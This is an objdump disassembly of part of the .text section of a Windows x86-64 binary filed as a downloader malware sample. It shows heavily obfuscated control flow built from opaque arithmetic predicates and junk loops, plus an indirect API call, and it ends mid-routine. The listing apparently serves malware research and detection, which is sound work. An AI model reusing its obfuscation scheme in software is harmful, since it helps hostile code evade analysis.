
malware_samples/downloader/b7b6fd7461869a41bf7a4e3d8b55ddb3c2189c618f524b4780de4536bf24ab5b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180001004:	55                   	push   %rbp
   180001005:	53                   	push   %rbx
   180001006:	56                   	push   %rsi
   180001007:	41 54                	push   %r12
   180001009:	41 55                	push   %r13
   18000100b:	41 56                	push   %r14
   18000100d:	41 57                	push   %r15
   18000100f:	48 8d ac 24 d0 fe ff 	lea    -0x130(%rsp),%rbp
   180001016:	ff 
   180001017:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   18000101e:	41 bf 02 00 00 00    	mov    $0x2,%r15d
   180001024:	41 bd e9 f4 2c 00    	mov    $0x2cf4e9,%r13d
   18000102a:	44 89 ad 78 01 00 00 	mov    %r13d,0x178(%rbp)
   180001031:	41 bc 56 55 55 55    	mov    $0x55555556,%r12d
   180001037:	44 89 ad 80 01 00 00 	mov    %r13d,0x180(%rbp)
   18000103e:	41 bb 03 00 00 80    	mov    $0x80000003,%r11d
   180001044:	44 8b 85 80 01 00 00 	mov    0x180(%rbp),%r8d
   18000104b:	8b f1                	mov    %ecx,%esi
   18000104d:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   180001053:	45 8d 77 fa          	lea    -0x6(%r15),%r14d
   180001057:	44 03 c0             	add    %eax,%r8d
   18000105a:	45 8d 4f fc          	lea    -0x4(%r15),%r9d
   18000105e:	41 8b c4             	mov    %r12d,%eax
   180001061:	45 8d 53 fe          	lea    -0x2(%r11),%r10d
   180001065:	41 f7 e8             	imul   %r8d
   180001068:	41 8d 5f ff          	lea    -0x1(%r15),%ebx
   18000106c:	8b c2                	mov    %edx,%eax
   18000106e:	c1 e8 1f             	shr    $0x1f,%eax
   180001071:	03 d0                	add    %eax,%edx
   180001073:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001076:	44 3b c0             	cmp    %eax,%r8d
   180001079:	0f 84 8b 00 00 00    	je     0x18000110a
   18000107f:	8b 8d 78 01 00 00    	mov    0x178(%rbp),%ecx
   180001085:	41 03 cf             	add    %r15d,%ecx
   180001088:	03 ce                	add    %esi,%ecx
   18000108a:	89 8d 78 01 00 00    	mov    %ecx,0x178(%rbp)
   180001090:	eb 1c                	jmp    0x1800010ae
   180001092:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   180001098:	03 c3                	add    %ebx,%eax
   18000109a:	89 85 78 01 00 00    	mov    %eax,0x178(%rbp)
   1800010a0:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800010a6:	03 c3                	add    %ebx,%eax
   1800010a8:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800010ae:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   1800010b4:	41 23 c3             	and    %r11d,%eax
   1800010b7:	7d 07                	jge    0x1800010c0
   1800010b9:	2b c3                	sub    %ebx,%eax
   1800010bb:	41 0b c6             	or     %r14d,%eax
   1800010be:	03 c3                	add    %ebx,%eax
   1800010c0:	85 c0                	test   %eax,%eax
   1800010c2:	74 ce                	je     0x180001092
   1800010c4:	44 89 ad 78 01 00 00 	mov    %r13d,0x178(%rbp)
   1800010cb:	44 89 ad 80 01 00 00 	mov    %r13d,0x180(%rbp)
   1800010d2:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800010d8:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   1800010de:	03 c8                	add    %eax,%ecx
   1800010e0:	41 8b c4             	mov    %r12d,%eax
   1800010e3:	f7 e9                	imul   %ecx
   1800010e5:	8b c2                	mov    %edx,%eax
   1800010e7:	c1 e8 1f             	shr    $0x1f,%eax
   1800010ea:	03 d0                	add    %eax,%edx
   1800010ec:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800010ef:	3b c8                	cmp    %eax,%ecx
   1800010f1:	0f 84 97 00 00 00    	je     0x18000118e
   1800010f7:	8b 8d 78 01 00 00    	mov    0x178(%rbp),%ecx
   1800010fd:	41 03 cf             	add    %r15d,%ecx
   180001100:	03 ce                	add    %esi,%ecx
   180001102:	89 8d 78 01 00 00    	mov    %ecx,0x178(%rbp)
   180001108:	eb 6c                	jmp    0x180001176
   18000110a:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   180001110:	41 8b cf             	mov    %r15d,%ecx
   180001113:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   180001119:	2b ce                	sub    %esi,%ecx
   18000111b:	03 c8                	add    %eax,%ecx
   18000111d:	89 8d 78 01 00 00    	mov    %ecx,0x178(%rbp)
   180001123:	8b 8d 78 01 00 00    	mov    0x178(%rbp),%ecx
   180001129:	41 8b c4             	mov    %r12d,%eax
   18000112c:	f7 e9                	imul   %ecx
   18000112e:	8b c2                	mov    %edx,%eax
   180001130:	c1 e8 1f             	shr    $0x1f,%eax
   180001133:	03 d0                	add    %eax,%edx
   180001135:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001138:	3b c8                	cmp    %eax,%ecx
   18000113a:	75 88                	jne    0x1800010c4
   18000113c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001142:	03 c3                	add    %ebx,%eax
   180001144:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000114a:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   180001150:	03 c3                	add    %ebx,%eax
   180001152:	89 85 78 01 00 00    	mov    %eax,0x178(%rbp)
   180001158:	eb c9                	jmp    0x180001123
   18000115a:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   180001160:	03 c3                	add    %ebx,%eax
   180001162:	89 85 78 01 00 00    	mov    %eax,0x178(%rbp)
   180001168:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000116e:	03 c3                	add    %ebx,%eax
   180001170:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001176:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   18000117c:	41 23 c3             	and    %r11d,%eax
   18000117f:	7d 07                	jge    0x180001188
   180001181:	2b c3                	sub    %ebx,%eax
   180001183:	41 0b c6             	or     %r14d,%eax
   180001186:	03 c3                	add    %ebx,%eax
   180001188:	85 c0                	test   %eax,%eax
   18000118a:	74 ce                	je     0x18000115a
   18000118c:	eb 50                	jmp    0x1800011de
   18000118e:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   180001194:	41 8b cf             	mov    %r15d,%ecx
   180001197:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   18000119d:	2b ce                	sub    %esi,%ecx
   18000119f:	03 c8                	add    %eax,%ecx
   1800011a1:	89 8d 78 01 00 00    	mov    %ecx,0x178(%rbp)
   1800011a7:	eb 1c                	jmp    0x1800011c5
   1800011a9:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800011af:	03 c3                	add    %ebx,%eax
   1800011b1:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800011b7:	8b 85 78 01 00 00    	mov    0x178(%rbp),%eax
   1800011bd:	03 c3                	add    %ebx,%eax
   1800011bf:	89 85 78 01 00 00    	mov    %eax,0x178(%rbp)
   1800011c5:	8b 8d 78 01 00 00    	mov    0x178(%rbp),%ecx
   1800011cb:	41 8b c4             	mov    %r12d,%eax
   1800011ce:	f7 e9                	imul   %ecx
   1800011d0:	8b c2                	mov    %edx,%eax
   1800011d2:	c1 e8 1f             	shr    $0x1f,%eax
   1800011d5:	03 d0                	add    %eax,%edx
   1800011d7:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800011da:	3b c8                	cmp    %eax,%ecx
   1800011dc:	74 cb                	je     0x1800011a9
   1800011de:	44 89 ad 80 01 00 00 	mov    %r13d,0x180(%rbp)
   1800011e5:	44 89 ad 88 01 00 00 	mov    %r13d,0x188(%rbp)
   1800011ec:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800011f2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800011f8:	03 c8                	add    %eax,%ecx
   1800011fa:	41 8b c4             	mov    %r12d,%eax
   1800011fd:	88 9d 78 01 00 00    	mov    %bl,0x178(%rbp)
   180001203:	f7 e9                	imul   %ecx
   180001205:	8b c2                	mov    %edx,%eax
   180001207:	c1 e8 1f             	shr    $0x1f,%eax
   18000120a:	03 d0                	add    %eax,%edx
   18000120c:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000120f:	3b c8                	cmp    %eax,%ecx
   180001211:	74 47                	je     0x18000125a
   180001213:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001219:	41 03 cf             	add    %r15d,%ecx
   18000121c:	03 ce                	add    %esi,%ecx
   18000121e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001224:	eb 1c                	jmp    0x180001242
   180001226:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000122c:	03 c3                	add    %ebx,%eax
   18000122e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001234:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000123a:	03 c3                	add    %ebx,%eax
   18000123c:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001242:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001248:	41 23 c3             	and    %r11d,%eax
   18000124b:	7d 07                	jge    0x180001254
   18000124d:	2b c3                	sub    %ebx,%eax
   18000124f:	41 0b c6             	or     %r14d,%eax
   180001252:	03 c3                	add    %ebx,%eax
   180001254:	85 c0                	test   %eax,%eax
   180001256:	74 ce                	je     0x180001226
   180001258:	eb 50                	jmp    0x1800012aa
   18000125a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001260:	41 8b cf             	mov    %r15d,%ecx
   180001263:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001269:	2b ce                	sub    %esi,%ecx
   18000126b:	03 c8                	add    %eax,%ecx
   18000126d:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001273:	eb 1c                	jmp    0x180001291
   180001275:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000127b:	03 c3                	add    %ebx,%eax
   18000127d:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001283:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001289:	03 c3                	add    %ebx,%eax
   18000128b:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001291:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001297:	41 8b c4             	mov    %r12d,%eax
   18000129a:	f7 e9                	imul   %ecx
   18000129c:	8b c2                	mov    %edx,%eax
   18000129e:	c1 e8 1f             	shr    $0x1f,%eax
   1800012a1:	03 d0                	add    %eax,%edx
   1800012a3:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800012a6:	3b c8                	cmp    %eax,%ecx
   1800012a8:	74 cb                	je     0x180001275
   1800012aa:	44 89 ad 80 01 00 00 	mov    %r13d,0x180(%rbp)
   1800012b1:	44 89 ad 88 01 00 00 	mov    %r13d,0x188(%rbp)
   1800012b8:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800012be:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800012c4:	03 c8                	add    %eax,%ecx
   1800012c6:	41 8b c4             	mov    %r12d,%eax
   1800012c9:	89 74 24 2c          	mov    %esi,0x2c(%rsp)
   1800012cd:	f7 e9                	imul   %ecx
   1800012cf:	8b c2                	mov    %edx,%eax
   1800012d1:	c1 e8 1f             	shr    $0x1f,%eax
   1800012d4:	03 d0                	add    %eax,%edx
   1800012d6:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800012d9:	3b c8                	cmp    %eax,%ecx
   1800012db:	74 47                	je     0x180001324
   1800012dd:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800012e3:	41 03 cf             	add    %r15d,%ecx
   1800012e6:	03 ce                	add    %esi,%ecx
   1800012e8:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800012ee:	eb 1c                	jmp    0x18000130c
   1800012f0:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800012f6:	03 c3                	add    %ebx,%eax
   1800012f8:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800012fe:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001304:	03 c3                	add    %ebx,%eax
   180001306:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000130c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001312:	41 23 c3             	and    %r11d,%eax
   180001315:	7d 07                	jge    0x18000131e
   180001317:	2b c3                	sub    %ebx,%eax
   180001319:	41 0b c6             	or     %r14d,%eax
   18000131c:	03 c3                	add    %ebx,%eax
   18000131e:	85 c0                	test   %eax,%eax
   180001320:	74 ce                	je     0x1800012f0
   180001322:	eb 50                	jmp    0x180001374
   180001324:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000132a:	41 8b cf             	mov    %r15d,%ecx
   18000132d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001333:	2b ce                	sub    %esi,%ecx
   180001335:	03 c8                	add    %eax,%ecx
   180001337:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000133d:	eb 1c                	jmp    0x18000135b
   18000133f:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001345:	03 c3                	add    %ebx,%eax
   180001347:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000134d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001353:	03 c3                	add    %ebx,%eax
   180001355:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000135b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001361:	41 8b c4             	mov    %r12d,%eax
   180001364:	f7 e9                	imul   %ecx
   180001366:	8b c2                	mov    %edx,%eax
   180001368:	c1 e8 1f             	shr    $0x1f,%eax
   18000136b:	03 d0                	add    %eax,%edx
   18000136d:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001370:	3b c8                	cmp    %eax,%ecx
   180001372:	74 cb                	je     0x18000133f
   180001374:	44 89 ad 80 01 00 00 	mov    %r13d,0x180(%rbp)
   18000137b:	44 89 ad 88 01 00 00 	mov    %r13d,0x188(%rbp)
   180001382:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180001388:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000138e:	03 c8                	add    %eax,%ecx
   180001390:	41 8b c4             	mov    %r12d,%eax
   180001393:	f7 e9                	imul   %ecx
   180001395:	8b c2                	mov    %edx,%eax
   180001397:	c1 e8 1f             	shr    $0x1f,%eax
   18000139a:	03 d0                	add    %eax,%edx
   18000139c:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000139f:	3b c8                	cmp    %eax,%ecx
   1800013a1:	74 47                	je     0x1800013ea
   1800013a3:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800013a9:	41 03 cf             	add    %r15d,%ecx
   1800013ac:	03 ce                	add    %esi,%ecx
   1800013ae:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800013b4:	eb 1c                	jmp    0x1800013d2
   1800013b6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800013bc:	03 c3                	add    %ebx,%eax
   1800013be:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800013c4:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800013ca:	03 c3                	add    %ebx,%eax
   1800013cc:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800013d2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800013d8:	41 23 c3             	and    %r11d,%eax
   1800013db:	7d 07                	jge    0x1800013e4
   1800013dd:	2b c3                	sub    %ebx,%eax
   1800013df:	41 0b c6             	or     %r14d,%eax
   1800013e2:	03 c3                	add    %ebx,%eax
   1800013e4:	85 c0                	test   %eax,%eax
   1800013e6:	74 ce                	je     0x1800013b6
   1800013e8:	eb 50                	jmp    0x18000143a
   1800013ea:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800013f0:	41 8b cf             	mov    %r15d,%ecx
   1800013f3:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800013f9:	2b ce                	sub    %esi,%ecx
   1800013fb:	03 c8                	add    %eax,%ecx
   1800013fd:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001403:	eb 1c                	jmp    0x180001421
   180001405:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000140b:	03 c3                	add    %ebx,%eax
   18000140d:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001413:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001419:	03 c3                	add    %ebx,%eax
   18000141b:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001421:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001427:	41 8b c4             	mov    %r12d,%eax
   18000142a:	f7 e9                	imul   %ecx
   18000142c:	8b c2                	mov    %edx,%eax
   18000142e:	c1 e8 1f             	shr    $0x1f,%eax
   180001431:	03 d0                	add    %eax,%edx
   180001433:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001436:	3b c8                	cmp    %eax,%ecx
   180001438:	74 cb                	je     0x180001405
   18000143a:	44 0f b6 ad 70 01 00 	movzbl 0x170(%rbp),%r13d
   180001441:	00 
   180001442:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180001447:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000144d:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001453:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180001459:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000145f:	03 c8                	add    %eax,%ecx
   180001461:	41 8b c4             	mov    %r12d,%eax
   180001464:	f7 e9                	imul   %ecx
   180001466:	8b c2                	mov    %edx,%eax
   180001468:	c1 e8 1f             	shr    $0x1f,%eax
   18000146b:	03 d0                	add    %eax,%edx
   18000146d:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001470:	3b c8                	cmp    %eax,%ecx
   180001472:	74 48                	je     0x1800014bc
   180001474:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000147a:	41 03 cf             	add    %r15d,%ecx
   18000147d:	41 03 cd             	add    %r13d,%ecx
   180001480:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001486:	eb 1c                	jmp    0x1800014a4
   180001488:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000148e:	03 c3                	add    %ebx,%eax
   180001490:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001496:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000149c:	03 c3                	add    %ebx,%eax
   18000149e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800014a4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800014aa:	41 23 c3             	and    %r11d,%eax
   1800014ad:	7d 07                	jge    0x1800014b6
   1800014af:	2b c3                	sub    %ebx,%eax
   1800014b1:	41 0b c6             	or     %r14d,%eax
   1800014b4:	03 c3                	add    %ebx,%eax
   1800014b6:	85 c0                	test   %eax,%eax
   1800014b8:	74 ce                	je     0x180001488
   1800014ba:	eb 51                	jmp    0x18000150d
   1800014bc:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800014c2:	41 8b cf             	mov    %r15d,%ecx
   1800014c5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800014cb:	41 2b cd             	sub    %r13d,%ecx
   1800014ce:	03 c8                	add    %eax,%ecx
   1800014d0:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800014d6:	eb 1c                	jmp    0x1800014f4
   1800014d8:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800014de:	03 c3                	add    %ebx,%eax
   1800014e0:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800014e6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800014ec:	03 c3                	add    %ebx,%eax
   1800014ee:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800014f4:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800014fa:	41 8b c4             	mov    %r12d,%eax
   1800014fd:	f7 e9                	imul   %ecx
   1800014ff:	8b c2                	mov    %edx,%eax
   180001501:	c1 e8 1f             	shr    $0x1f,%eax
   180001504:	03 d0                	add    %eax,%edx
   180001506:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001509:	3b c8                	cmp    %eax,%ecx
   18000150b:	74 cb                	je     0x1800014d8
   18000150d:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180001512:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001518:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000151e:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180001524:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000152a:	03 c8                	add    %eax,%ecx
   18000152c:	41 8b c4             	mov    %r12d,%eax
   18000152f:	f7 e9                	imul   %ecx
   180001531:	8b c2                	mov    %edx,%eax
   180001533:	c1 e8 1f             	shr    $0x1f,%eax
   180001536:	03 d0                	add    %eax,%edx
   180001538:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000153b:	3b c8                	cmp    %eax,%ecx
   18000153d:	74 4d                	je     0x18000158c
   18000153f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001545:	8b 05 cd 7a 02 00    	mov    0x27acd(%rip),%eax        # 0x180029018
   18000154b:	41 03 c7             	add    %r15d,%eax
   18000154e:	03 c8                	add    %eax,%ecx
   180001550:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001556:	eb 1c                	jmp    0x180001574
   180001558:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000155e:	03 c3                	add    %ebx,%eax
   180001560:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001566:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000156c:	03 c3                	add    %ebx,%eax
   18000156e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001574:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000157a:	41 23 c3             	and    %r11d,%eax
   18000157d:	7d 07                	jge    0x180001586
   18000157f:	2b c3                	sub    %ebx,%eax
   180001581:	41 0b c6             	or     %r14d,%eax
   180001584:	03 c3                	add    %ebx,%eax
   180001586:	85 c0                	test   %eax,%eax
   180001588:	74 ce                	je     0x180001558
   18000158a:	eb 4e                	jmp    0x1800015da
   18000158c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001592:	41 8b cf             	mov    %r15d,%ecx
   180001595:	2b 0d 7d 7a 02 00    	sub    0x27a7d(%rip),%ecx        # 0x180029018
   18000159b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800015a1:	03 c1                	add    %ecx,%eax
   1800015a3:	eb 16                	jmp    0x1800015bb
   1800015a5:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800015ab:	03 c3                	add    %ebx,%eax
   1800015ad:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800015b3:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800015b9:	03 c3                	add    %ebx,%eax
   1800015bb:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800015c1:	41 8b c4             	mov    %r12d,%eax
   1800015c4:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800015ca:	f7 e9                	imul   %ecx
   1800015cc:	8b c2                	mov    %edx,%eax
   1800015ce:	c1 e8 1f             	shr    $0x1f,%eax
   1800015d1:	03 d0                	add    %eax,%edx
   1800015d3:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800015d6:	3b c8                	cmp    %eax,%ecx
   1800015d8:	74 cb                	je     0x1800015a5
   1800015da:	48 83 3d 36 7a 02 00 	cmpq   $0x0,0x27a36(%rip)        # 0x180029018
   1800015e1:	00 
   1800015e2:	0f 84 d8 01 00 00    	je     0x1800017c0
   1800015e8:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800015ed:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800015f3:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800015f9:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800015ff:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001605:	03 c8                	add    %eax,%ecx
   180001607:	41 8b c4             	mov    %r12d,%eax
   18000160a:	f7 e9                	imul   %ecx
   18000160c:	8b c2                	mov    %edx,%eax
   18000160e:	c1 e8 1f             	shr    $0x1f,%eax
   180001611:	03 d0                	add    %eax,%edx
   180001613:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001616:	3b c8                	cmp    %eax,%ecx
   180001618:	74 4d                	je     0x180001667
   18000161a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001620:	8b 05 f2 79 02 00    	mov    0x279f2(%rip),%eax        # 0x180029018
   180001626:	41 03 c7             	add    %r15d,%eax
   180001629:	03 c8                	add    %eax,%ecx
   18000162b:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001631:	eb 1c                	jmp    0x18000164f
   180001633:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001639:	03 c3                	add    %ebx,%eax
   18000163b:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001641:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001647:	03 c3                	add    %ebx,%eax
   180001649:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000164f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001655:	41 23 c3             	and    %r11d,%eax
   180001658:	7d 07                	jge    0x180001661
   18000165a:	2b c3                	sub    %ebx,%eax
   18000165c:	41 0b c6             	or     %r14d,%eax
   18000165f:	03 c3                	add    %ebx,%eax
   180001661:	85 c0                	test   %eax,%eax
   180001663:	74 ce                	je     0x180001633
   180001665:	eb 4e                	jmp    0x1800016b5
   180001667:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000166d:	41 8b cf             	mov    %r15d,%ecx
   180001670:	2b 0d a2 79 02 00    	sub    0x279a2(%rip),%ecx        # 0x180029018
   180001676:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000167c:	03 c1                	add    %ecx,%eax
   18000167e:	eb 16                	jmp    0x180001696
   180001680:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001686:	03 c3                	add    %ebx,%eax
   180001688:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000168e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001694:	03 c3                	add    %ebx,%eax
   180001696:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000169c:	41 8b c4             	mov    %r12d,%eax
   18000169f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800016a5:	f7 e9                	imul   %ecx
   1800016a7:	8b c2                	mov    %edx,%eax
   1800016a9:	c1 e8 1f             	shr    $0x1f,%eax
   1800016ac:	03 d0                	add    %eax,%edx
   1800016ae:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800016b1:	3b c8                	cmp    %eax,%ecx
   1800016b3:	74 cb                	je     0x180001680
   1800016b5:	48 8b 0d 5c 79 02 00 	mov    0x2795c(%rip),%rcx        # 0x180029018
   1800016bc:	33 d2                	xor    %edx,%edx
   1800016be:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   1800016c4:	ff 15 86 79 02 00    	call   *0x27986(%rip)        # 0x180029050
   1800016ca:	41 b8 e9 f4 2c 00    	mov    $0x2cf4e9,%r8d
   1800016d0:	44 89 85 80 01 00 00 	mov    %r8d,0x180(%rbp)
   1800016d7:	44 89 85 88 01 00 00 	mov    %r8d,0x188(%rbp)
   1800016de:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800016e4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800016ea:	03 c8                	add    %eax,%ecx
   1800016ec:	41 8b c4             	mov    %r12d,%eax
   1800016ef:	f7 e9                	imul   %ecx
   1800016f1:	8b c2                	mov    %edx,%eax
   1800016f3:	c1 e8 1f             	shr    $0x1f,%eax
   1800016f6:	03 d0                	add    %eax,%edx
   1800016f8:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800016fb:	3b c8                	cmp    %eax,%ecx
   1800016fd:	74 5f                	je     0x18000175e
   1800016ff:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001705:	41 bb 03 00 00 80    	mov    $0x80000003,%r11d
   18000170b:	8b 05 07 79 02 00    	mov    0x27907(%rip),%eax        # 0x180029018
   180001711:	41 03 c7             	add    %r15d,%eax
   180001714:	03 c8                	add    %eax,%ecx
   180001716:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000171c:	eb 1c                	jmp    0x18000173a
   18000171e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001724:	03 c3                	add    %ebx,%eax
   180001726:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
